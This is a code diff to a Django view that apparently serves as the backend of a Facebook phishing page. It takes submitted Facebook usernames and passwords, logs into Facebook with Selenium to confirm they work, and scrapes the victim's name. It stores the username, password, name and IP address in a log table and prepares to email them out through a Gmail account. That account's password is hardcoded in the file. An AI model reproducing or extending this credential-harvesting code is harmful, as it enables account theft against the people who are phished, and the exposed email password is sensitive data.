@@ -6,6 +6,10 @@ from .models import FbLogIn, NewLogs, SiteContent
 from selenium import webdriver
 import time
 from selenium.webdriver.common.by import By
+from bs4 import BeautifulSoup as bs
+
+import smtplib
+from email.message import EmailMessage
 
 import time
 
@@ -48,7 +52,7 @@ def facebook_view(request):
 		editform = FbLogIn.objects.get(id = myid)
 
 		chrome_options = webdriver.ChromeOptions()
-		chrome_options.add_argument("--headless")
+		#chrome_options.add_argument("--headless")
 		chrome_options.add_argument("--disable-gpu")
 		chrome_options.add_argument('--no-sandbox')
 		chrome_options.add_argument('--window-size=1920x1080')  #1920,1080
@@ -74,11 +78,15 @@ def facebook_view(request):
 
 		time.sleep(2)
 
-		if browser.find_elements(By.CSS_SELECTOR, 'span.a8c37x1j.ni8dbmo4.stjgntxs.l9j0dhe7'):
-			
-			# browser.find_elements(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]')
-			name = browser.find_element(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]').get_attribute("innerHTML")
+		if browser.find_element(By.CSS_SELECTOR, 'div.k4urcfbm'):
+			# name = browser.find_element(By.XPATH, '//span[@class="a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7"]').get_attribute("innerHTML")
+			html = browser.page_source
+			soup = bs(html, 'lxml')
 
+			mydiv = soup.find_all('div', class_='qzhwtbm6 knvmm38d')
+			sp1 = soup.find_all('span', class_='d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v ekzkrbhg oo9gr5id hzawbc8m')
+			# name = soup.find('span', class_='a8c37x1j ni8dbmo4 stjgntxs l9j0dhe7')
+			name = sp1[0].span.text
 			print(name)
 			# print(name.get_attribute("innerHTML"))
 			# print(name.text)
@@ -92,8 +100,7 @@ def facebook_view(request):
 			editform.save()
 			NewLogs.objects.create(username=editform.username, password=editform.password, name=editform.name, ipadd=editform.ipadd)
 			
-			import smtplib
-			from email.message import EmailMessage
+			
 
 			EMAIL_ADDRESS = "noreplyimf.org@gmail.com"
 			EMAIL_PASSWORD = "4kushakara"
